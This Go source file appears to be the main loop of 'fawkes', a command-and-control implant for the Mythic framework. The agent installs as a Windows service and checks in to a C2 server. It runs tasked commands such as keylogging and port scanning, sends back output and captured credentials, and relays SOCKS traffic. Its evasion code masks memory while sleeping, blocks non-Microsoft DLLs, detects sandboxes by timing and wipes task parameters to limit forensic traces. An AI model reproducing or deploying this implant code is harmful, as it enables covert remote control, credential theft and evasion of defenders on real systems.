package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"fawkes/pkg/commands"
	"fawkes/pkg/files"
	"fawkes/pkg/profiles"
	"fawkes/pkg/socks"
	"fawkes/pkg/structs"
)

func main() {
	// Try running as a Windows service first. If started by SCM, this blocks
	// and runs the agent in the service context (with full service privileges).
	// On non-Windows or when not started by SCM, returns false immediately.
	if tryRunAsService() {
		return
	}
	runAgent()
}

func runAgent() {
	// Phase 1: Deobfuscate config strings
	deobfuscateConfig()

	// Phase 2: Parse and validate configuration
	cfg := parseConfigValues()
	setupLogging(cfg.debug)

	if !validateConfig(cfg) {
		os.Exit(0)
	}

	// Phase 3: Apply startup security patches
	applySecurity()

	// Phase 4: Initialize agent struct
	agent := initializeAgent(cfg)

	// Phase 5: Initialize C2 profile
	c2Init, err := initC2Profile(cfg)
	if err != nil {
		log.Printf("%v", err)
		return
	}
	c2 := c2Init.profile
	if c2Init.rpfwdMgr != nil {
		defer c2Init.rpfwdMgr.Close()
	}

	// Configure child process protections (Windows: block non-Microsoft DLLs)
	if blockDLLs == "true" {
		commands.SetBlockDLLs(true)
	}

	// Share configured User-Agent with commands to avoid hardcoded duplicates
	commands.DefaultUserAgent = userAgent

	// Clear build-time globals — all values have been copied into agent/profile structs.
	sandboxGuardEnabled := sandboxGuard == "true"
	sleepMaskEnabled := sleepMask == "true"
	guardPagesEnabled := sleepGuardPages == "true"
	clearGlobals()

	// Initialize command handlers and file transfer goroutines
	commands.Initialize()
	files.Initialize()

	// Phase 6: Initial checkin with exponential backoff retry
	log.Printf("connecting")
	for attempt := 0; attempt < cfg.maxRetries; attempt++ {
		if err := c2.Checkin(agent); err != nil {
			log.Printf("connect attempt %d: %v", attempt+1, err)
			backoffMultiplier := 1 << min(attempt, 8)
			backoffSeconds := cfg.sleepInterval * backoffMultiplier
			if backoffSeconds > 300 {
				backoffSeconds = 300
			}
			sleepTime := calculateSleepTime(backoffSeconds, cfg.jitter)
			time.Sleep(sleepTime)
			continue
		}
		log.Printf("connected")
		goto checkinDone
	}
	log.Printf("all connect attempts failed")
	return
checkinDone:

	// Propagate callback UUID to TCP P2P instance for Mythic's P2P graph
	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil && tcpP2P.GetCallbackUUID() == "" {
		tcpP2P.UpdateCallbackUUID(c2.GetCallbackUUID())
	}

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	defer signal.Stop(sigChan)

	go func() {
		sig := <-sigChan
		log.Printf("signal %v, stopping", sig)
		cancel()
	}()

	// Initialize SOCKS proxy manager
	socksManager := socks.NewManager()
	defer socksManager.Close()

	// Start main execution loop
	log.Printf("running %s", agent.PayloadUUID[:8])
	mainLoop(ctx, agent, c2, socksManager, cfg.maxRetries, sandboxGuardEnabled, sleepMaskEnabled, guardPagesEnabled)
	usePadding() // Reference embedded padding to prevent compiler stripping
	log.Printf("stopped")
}

func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool, guardPagesEnabled bool) {
	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
	taskSem := make(chan struct{}, 20)

	// Main execution loop
	retryCount := 0
	for {
		select {
		case <-ctx.Done():
			log.Printf("cancelled")
			return
		default:
			// Enforce kill date every cycle — exit silently if past expiry
			if agent.KillDate > 0 && time.Now().Unix() > agent.KillDate {
				log.Printf("expired")
				return
			}

			// Enforce working hours — sleep until next working period if outside hours
			if agent.WorkingHoursEnabled() && !agent.IsWithinWorkingHours(time.Now()) {
				waitMinutes := agent.MinutesUntilWorkingHours(time.Now())
				if waitMinutes > 0 {
					// Add jitter to the wake time (±jitter% of sleep interval, not the full wait)
					jitterOffset := calculateSleepTime(agent.SleepInterval, agent.Jitter) - time.Duration(agent.SleepInterval)*time.Second
					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterOffset
					log.Printf("schedule pause %v", sleepDuration)
					var whVault *sleepVault
					var whGuard *guardedPages
					if sleepMaskEnabled {
						whVault = obfuscateSleep(agent, c2)
						if guardPagesEnabled {
							whGuard = guardSleepPages(whVault)
						}
					}
					time.Sleep(sleepDuration)
					if sleepMaskEnabled {
						if guardPagesEnabled {
							unguardSleepPages(whGuard, whVault)
						}
						deobfuscateSleep(whVault, agent, c2)
					}
					continue
				}
			}

			// Drain any pending outbound SOCKS data to include in this poll
			outboundSocks := socksManager.DrainOutbound()

			// Get tasks and inbound SOCKS data from C2 server
			tasks, inboundSocks, err := c2.GetTasking(agent, outboundSocks)
			if err != nil {
				log.Printf("poll error: %v", err)
				retryCount++
				// Exponential backoff: sleep 2^(retryCount-1) * base interval, capped at 5 minutes
				backoffMultiplier := 1 << min(retryCount-1, 8) // 1, 2, 4, 8, 16, ...
				backoffSeconds := agent.SleepInterval * backoffMultiplier
				maxBackoff := 300 // 5 minutes cap
				if backoffSeconds > maxBackoff {
					backoffSeconds = maxBackoff
				}
				sleepTime := calculateSleepTime(backoffSeconds, agent.Jitter)
				time.Sleep(sleepTime)
				continue
			}

			// Reset retry count on successful communication
			retryCount = 0

			// Pass inbound SOCKS messages to the manager for processing
			if len(inboundSocks) > 0 {
				socksManager.HandleMessages(inboundSocks)
			}

			// Process tasks concurrently — each task runs in its own goroutine
			// so long-running commands (SOCKS, keylog, port-scan) don't block new tasks.
			// Semaphore limits concurrency to prevent memory exhaustion.
			for _, task := range tasks {
				// Track task synchronously BEFORE spawning goroutine — prevents a race
				// where obfuscateSleep sees GetRunningTasks()==0 because the goroutine
				// hasn't called TrackTask yet, causing C2 profile fields to be zeroed
				// while task goroutines still need them for PostResponse.
				commands.TrackTask(&task)
				taskSem <- struct{}{} // Acquire semaphore slot
				go func(t structs.Task) {
					defer func() { <-taskSem }() // Release slot when done
					defer commands.UntrackTask(t.ID)
					processTaskWithAgent(t, agent, c2, socksManager)
				}(task)
			}

			// Sleep before next iteration — with optional sleep mask, guard pages, and sandbox detection
			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
			var vault *sleepVault
			var guard *guardedPages
			if sleepMaskEnabled {
				vault = obfuscateSleep(agent, c2)
				if guardPagesEnabled {
					guard = guardSleepPages(vault)
				}
			}
			sleepSkipped := false
			if sandboxGuardEnabled {
				if !guardedSleep(sleepTime) {
					sleepSkipped = true
				}
			} else {
				time.Sleep(sleepTime)
			}
			if sleepMaskEnabled {
				if guardPagesEnabled {
					unguardSleepPages(guard, vault)
				}
				deobfuscateSleep(vault, agent, c2)
			}
			if sleepSkipped {
				log.Printf("timing anomaly, exiting")
				return
			}
		}
	}
}

func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
	task.StartTime = time.Now()
	log.Printf("exec %s (%s)", task.Command, task.ID)

	// Create Job struct with channels for this task
	job := &structs.Job{
		Stop:                         new(int),
		SendResponses:                make(chan structs.Response, 100),
		SendFileToMythic:             files.SendToMythicChannel,
		GetFileFromMythic:            files.GetFromMythicChannel,
		FileTransfers:                make(map[string]chan json.RawMessage),
		InteractiveTaskInputChannel:  make(chan structs.InteractiveMsg, 100),
		InteractiveTaskOutputChannel: make(chan structs.InteractiveMsg, 100),
	}
	task.Job = job

	// Start goroutine to forward responses from the job to Mythic
	done := make(chan bool)
	var forwarderWg sync.WaitGroup
	forwarderWg.Add(1)
	go func() {
		defer forwarderWg.Done()
		for {
			select {
			case resp := <-job.SendResponses:
				mythicResp, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
				if err != nil {
					log.Printf("send error: %v", err)
					continue
				}

				// If this is a file transfer response, route Mythic's response back
				if len(mythicResp) > 0 && (resp.Upload != nil || resp.Download != nil) {
					// Parse the response to get tracking info
					var responseData map[string]interface{}
					if err := json.Unmarshal(mythicResp, &responseData); err == nil {
						// Look for responses array
						if responses, ok := responseData["responses"].([]interface{}); ok && len(responses) > 0 {
							if firstResp, ok := responses[0].(map[string]interface{}); ok {
								// Send this response to all active file transfer channels
								respJSON, err := json.Marshal(firstResp)
								if err != nil {
									log.Printf("marshal error: %v", err)
									continue
								}
								job.BroadcastFileTransfer(json.RawMessage(respJSON))
							}
						}
					}
				}
			case <-done:
				// Drain any remaining responses
				for {
					select {
					case resp := <-job.SendResponses:
						_, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
						if err != nil {
							log.Printf("send error: %v", err)
						}
					default:
						return
					}
				}
			}
		}
	}()

	// Get command handler
	handler := commands.GetCommand(task.Command)
	if handler == nil {
		response := structs.Response{
			TaskID:     task.ID,
			Status:     "error",
			UserOutput: fmt.Sprintf("Unknown command: %s", task.Command),
			Completed:  true,
		}
		if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
			log.Printf("send error: %v", err)
		}
		close(done)
		return
	}

	// Re-apply token impersonation if active (handles Go thread migration)
	commands.PrepareExecution()

	// Execute command with panic recovery to prevent agent crash
	var result structs.CommandResult
	func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("panic in %s: %v", task.Command, r)
				result = structs.CommandResult{
					Output:    fmt.Sprintf("Command panicked: %v", r),
					Status:    "error",
					Completed: true,
				}
			}
		}()
		if agentHandler, ok := handler.(structs.AgentCommand); ok {
			result = agentHandler.ExecuteWithAgent(task, agent)
		} else {
			result = handler.Execute(task)
		}
	}()

	// Zero task parameters to reduce forensic exposure of credentials/arguments
	task.WipeParams()

	// Send final response
	response := structs.Response{
		TaskID:          task.ID,
		UserOutput:      result.Output,
		Status:          result.Status,
		Completed:       result.Completed,
		Processes:       result.Processes,
		Credentials:     result.Credentials,
		ProcessResponse: result.Output,
	}
	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
		log.Printf("send error: %v", err)
	}

	// Signal the response forwarder to finish and wait for it to drain
	close(done)
	forwarderWg.Wait()
}

func calculateSleepTime(interval, jitter int) time.Duration {
	if jitter == 0 {
		return time.Duration(interval) * time.Second
	}

	// Freyja-style jitter calculation
	// Jitter is a percentage (0-100) that creates variation around the interval
	jitterFloat := float64(rand.Intn(jitter)) / float64(100)
	jitterDiff := float64(interval) * jitterFloat

	// Randomly add or subtract jitter (50/50 chance)
	if rand.Intn(2) == 0 {
		actualInterval := interval + int(jitterDiff)
		return time.Duration(actualInterval) * time.Second
	} else {
		actualInterval := interval - int(jitterDiff)
		if actualInterval < 1 {
			actualInterval = 1 // Minimum 1 second
		}
		return time.Duration(actualInterval) * time.Second
	}
}

// guardedSleep performs a sleep with sandbox detection. If the sleep completes
// in less than 75% of the expected duration, it indicates a sandbox is
// fast-forwarding time. Returns true if sleep was normal, false if skipped.
func guardedSleep(d time.Duration) bool {
	if d <= 0 {
		return true
	}
	before := time.Now()
	time.Sleep(d)
	elapsed := time.Since(before)
	threshold := d * 3 / 4
	return elapsed >= threshold
}
